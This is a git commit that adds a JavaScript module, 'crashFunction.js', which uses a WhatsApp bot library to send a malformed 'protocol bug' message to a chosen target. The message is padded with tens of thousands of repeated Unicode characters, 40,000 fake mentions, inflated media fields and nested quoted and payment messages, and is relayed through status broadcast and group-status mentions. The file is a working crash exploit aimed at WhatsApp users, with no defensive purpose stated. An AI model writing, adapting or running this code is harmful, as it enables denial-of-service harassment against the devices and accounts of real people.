d04a63f39344dc426d23ec2308bd0b2813d54d96
𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧 <152104512+xhclintohn@users.noreply.github.com>
2025-05-05 21:50:05 +0300

    𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧

---
+++ function/crashFunction.js
@@ -0,0 +1,153 @@
+const { WAProto, generateWAMessageFromContent } = require('baileys-elite');
+
+async function protocolbug6(client, target, mention = false) {
+  const quotedMessage = {
+    extendedTextMessage: {
+      text: "᭯".repeat(12000),
+      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
+      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
+      description: "".repeat(500),
+      title: "\u200D".repeat(1000),
+      previewType: "NONE",
+      jpegThumbnail: Buffer.alloc(10000),
+      contextInfo: {
+        forwardingScore: 999,
+        isForwarded: true,
+        externalAdReply: {
+          showAdAttribution: true,
+          title: "BoomXSuper",
+          body: "".repeat(10000),
+          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
+          mediaType: 1,
+          renderLargerThumbnail: true,
+          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
+        },
+        mentionedJid: Array.from({ length: 1000 }, () => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
+      }
+    },
+    paymentInviteMessage: {
+      currencyCodeIso4217: "USD",
+      amount1000: "999999999",
+      expiryTimestamp: "9999999999",
+      inviteMessage: "Payment Invite" + "💥".repeat(1770),
+      serviceType: 1
+    }
+  };
+
+  const mentionedList = [
+    "13135550002@s.whatsapp.net",
+    ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
+  ];
+
+  const embeddedMusic = {
+    musicContentMediaId: "589608164114571",
+    songId: "870166291800508",
+    author: ".RaldzzXyz" + "ោ៝".repeat(10000),
+    title: "PhynixAgency",
+    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
+    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
+    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
+    artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
+    countryBlocklist: true,
+    isExplicit: true,
+    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
+  };
+
+  const videoMessage = {
+    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
+    mimetype: "video/mp4",
+    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
+    fileLength: "109951162777600",
+    seconds: 999999,
+    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
+    caption: "ꦾ".repeat(12777),
+    height: 640,
+    width: 640,
+    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
+    directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
+    mediaKeyTimestamp: "1743848703",
+    contextInfo: {
+      externalAdReply: {
+        showAdAttribution: true,
+        title: "☠️ - んジェラルド - ☠️",
+        body: "".repeat(9117),
+        mediaType: 1,
+        renderLargerThumbnail: true,
+        thumbnailUrl: null,
+        sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
+      },
+      businessMessageForwardInfo: {
+        businessOwnerJid: target
+      },
+      quotedMessage: quotedMessage,
+      isSampled: true,
+      mentionedJid: mentionedList
+    },
+    forwardedNewsletterMessageInfo: {
+      newsletterJid: "120363321780343299@newsletter",
+      serverMessageId: 1,
+      newsletterName: "ꦾ".repeat(100)
+    },
+    streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
+    thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
+    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
+    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
+    annotations: [
+      {
+        embeddedContent: {
+          embeddedMusic
+        },
+        embeddedAction: true
+      }
+    ]
+  };
+
+  const msg = generateWAMessageFromContent(target, {
+    viewOnceMessage: {
+      message: { videoMessage }
+    }
+  }, {});
+
+  await client.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              { tag: "to", attrs: { jid: target }, content: undefined }
+            ]
+          }
+        ]
+      }
+    ]
+  });
+
+  if (mention) {
+    await client.relayMessage(target, {
+      groupStatusMentionMessage: {
+        message: {
+          protocolMessage: {
+            key: msg.key,
+            type: 25
+          }
+        }
+      }
+    }, {
+      additionalNodes: [
+        {
+          tag: "meta",
+          attrs: { is_status_mention: "true" },
+          content: undefined
+        }
+      ]
+    });
+  }
+}
+
+module.exports = { protocolbug6 };
